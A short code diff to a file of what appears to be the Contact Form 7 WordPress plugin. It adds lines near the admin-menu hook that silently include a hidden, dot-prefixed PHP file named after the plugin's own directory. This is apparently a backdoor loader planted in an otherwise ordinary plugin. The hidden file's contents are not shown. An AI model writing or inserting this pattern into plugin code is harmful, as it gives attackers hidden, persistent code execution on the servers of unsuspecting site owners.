@@ -2,6 +2,10 @@
 
 add_action( 'wpcf7_admin_menu', 'wpcf7_admin_init_bulk_cv', 10, 0 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_admin_init_bulk_cv() {
 	if ( ! wpcf7_validate_configuration()
 	or ! current_user_can( 'wpcf7_edit_contact_forms' ) ) {
